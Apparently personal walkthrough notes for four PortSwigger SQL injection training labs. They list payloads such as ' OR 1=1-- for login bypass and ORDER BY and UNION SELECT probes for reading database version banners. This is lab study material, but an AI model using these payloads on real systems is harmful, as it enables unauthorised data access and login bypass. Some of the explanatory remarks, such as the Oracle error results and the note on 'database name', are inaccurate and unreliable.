###### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
URL: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Endpoint: category

Steps:
```
1. Click on any filter item.
2. Insert the following payload in the url: category=' OR 1=1--
```


###### Lab: SQL injection vulnerability allowing login bypass
URL: https://portswigger.net/web-security/sql-injection/lab-login-bypass

Endpoint: username

Steps:
```
1. Go to login section.
2. Insert the following in the username section: administrator' OR 1=1--
```


###### Lab: SQL injection attack, querying the database type and version on Oracle
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

Endpoint: category

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal Server Error
4. Now we know that there are 2 items in the query.
5. Check the type of items in the query using:
5a. category=Gifts'+UNION+SELECT+1,1+FROM+dual--
	Response: error
5b. category=Gifts'+UNION+SELECT+'a',1+FROM+dual--
	Response: error
5c. category=Gifts'+UNION+SELECT+'a','a'+FROM+dual--
	Response: error
6.  category='+UNION+SELECT+banner,'b'+FROM+v$version--
	Response: Database version information
```

Note: We need to specify database name in case of oracle server thus we are using dual.
Ref: https://www.techonthenet.com/oracle/questions/version.php


###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
Endpoint:

Steps:
```
1. Click on any filter item.
2. Add ' to verify if sql injection exists.
3. Use the Order Clause to check the number of items that are being returned.
	3a. category=Gifts'+ORDER+BY+1--
	Response: Returns products
	3b. category=Gifts'+ORDER+BY+2--
	Response: Returns products
	3c. category=Gifts'+ORDER+BY+3--
	Response: Internal server error
4. Now we know that there are 2 items in the query.
5. Check the type of items in the query using:
6. category=Gifts'+UNION+SELECT+@@VERSION,'a'--+
   Response: Database version information
```

Note: Database name is not necessary in when using UNION SELECT on non-oracle MYSQL.
Ref: https://www.sqlshack.com/how-to-find-sql-server-version/